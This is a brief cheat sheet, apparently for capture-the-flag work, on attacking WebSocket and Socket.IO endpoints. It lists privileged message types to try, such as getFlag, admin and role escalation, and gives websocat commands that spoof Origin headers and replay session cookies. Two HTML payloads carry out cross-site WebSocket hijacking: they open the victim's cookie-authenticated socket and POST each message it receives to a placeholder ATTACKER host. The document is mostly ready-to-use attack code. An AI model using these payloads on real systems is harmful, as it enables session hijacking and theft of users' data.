# WebSocket

## Connect

```js
ws = new WebSocket("ws://HOST/ws")
ws.onmessage = e => console.log(e.data)
ws.onopen = () => ws.send(JSON.stringify({type:"ping"}))
```

With cookie in browser:

```html
<script>
let ws = new WebSocket("wss://HOST/ws")
ws.onmessage = e => fetch("https://ATTACKER/", {method:"POST", body:e.data})
ws.onopen = () => ws.send(JSON.stringify({type:"getFlag"}))
</script>
```

## Messages

```json
{"type":"getFlag"}
{"type":"admin"}
{"type":"join","room":"admin"}
{"type":"message","room":"admin","text":"x"}
{"type":"update","user_id":1,"role":"admin"}
```

## Socket.IO

```text
/socket.io/?EIO=4&transport=polling
/socket.io/?EIO=4&transport=websocket
```

```js
socket = io("https://HOST", {withCredentials:true})
socket.emit("join", "admin")
socket.emit("getFlag", {"id":1})
socket.onAny((ev, ...args) => console.log(ev, args))
```

## CSWSH

Use when WebSocket auth is cookie-only and no Origin check.

```html
<script>
let ws = new WebSocket("wss://HOST/ws")
ws.onopen = () => ws.send(JSON.stringify({type:"dump"}))
ws.onmessage = e => fetch("https://ATTACKER/", {method:"POST", body:e.data})
</script>
```

## Origin

Tool: https://github.com/vi/websocat

```bash
cargo install websocat
websocat -H='Origin: https://ATTACKER' ws://HOST/ws
websocat -H='Cookie: session=COOKIE' ws://HOST/ws
printf '{"type":"dump"}\n' | websocat -H='Cookie: session=COOKIE' ws://HOST/ws
```
